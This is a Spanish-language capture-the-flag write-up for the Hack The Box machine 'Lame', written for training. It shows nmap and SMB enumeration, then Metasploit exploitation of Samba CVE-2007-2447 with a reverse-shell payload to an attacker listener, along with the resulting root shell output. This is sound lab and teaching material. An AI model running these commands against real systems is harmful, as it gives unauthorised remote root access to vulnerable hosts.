# 🖥️ HTB: Lame

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Lame |
| **Plataforma** | Hack The Box |
| **Dificultad** | Easy |
| **Categoría** | Linux / SMB |
| **IP** | 10.10.10.3 |
| **OS** | Linux (Ubuntu 8.04) |
| **Fecha** | 2024 |
| **Tiempo** | 45 min |

---

## 🎯 Resumen Ejecutivo

> Exploté **Samba 3.0.20** (CVE-2007-2447) en el servicio SMB para obtener una shell remota como `root` directamente, sin necesidad de escalada de privilegios.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_lame.txt 10.10.10.3
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 21 | FTP | vsftpd 2.3.4 | Open |
| 22 | SSH | OpenSSH 4.7p1 | Open |
| 139 | SMB | Samba 3.0.20 | Open |
| 445 | SMB | Samba 3.0.20 | Open |

**Observación clave:** Samba 3.0.20 es vulnerable a CVE-2007-2447 (username map script).

### Enumeración SMB

```bash
# Listar shares
smbclient -L //10.10.10.3 -U ''

# Enumerar usuarios
enum4linux -a 10.10.10.3
```

**Resultado:**
```
Sharename       Type      Comment
---------       ----      -------
tmp             Disk      tmp directory
var             Disk      var directory
home            Disk      home directory
print$          Disk      Printer Drivers
IPC$            IPC       IPC service (3.0.20-Debian)
```

---

## 💥 Explotación

### Vulnerabilidad

**CVE:** CVE-2007-2447
**Tipo:** OS Command Injection via SMB
**Severidad:** Crítica (CVSS 9.8)
**Descripción:** Samba 3.0.20 permite inyección de comandos a través del nombre de usuario durante la autenticación SMB.

### Payload

```bash
# Usar Metasploit
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/reverse
set LHOST 10.10.14.x
exploit
```

**Resultado:**
```
[*] Started reverse TCP handler on 10.10.14.x:4444
[*] Command shell session 1 opened (10.10.14.x:4444 -> 10.10.10.3)
```

### Shell Obtenida

```bash
$ id
uid=0(root) gid=0(root)

$ whoami
root
```

**No fue necesaria escalada de privilegios** — el exploit entrega directamente root.

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `/home/flag.txt` |
| **Root** | `FLAG{...}` | `/root/root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- Nmap detectó Samba 3.0.20 inmediatamente
- Metasploit tiene exploit listo para esta versión
- El exploit entrega root sin escalada

### ❌ Lo que NO funcionó
- Intenté FTP (vsftpd 2.3.4 tiene backdoor, pero no estaba activo)
- Enumeración manual de SMB fue innecesaria

### 🔄 Qué haría diferente
- Verificar versiones de servicios antes de intentar exploits manuales
- Buscar en searchsploit antes de usar Metasploit

---

## 📚 Referencias

- [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [MITRE ATT&CK: T1210](https://attack.mitre.org/techniques/T1210/)
- [Samba Security Advisory](https://www.samba.org/samba/security/CVE-2007-2447.html)

---

*Writeup creado para CDPN — Nivel Fácil*
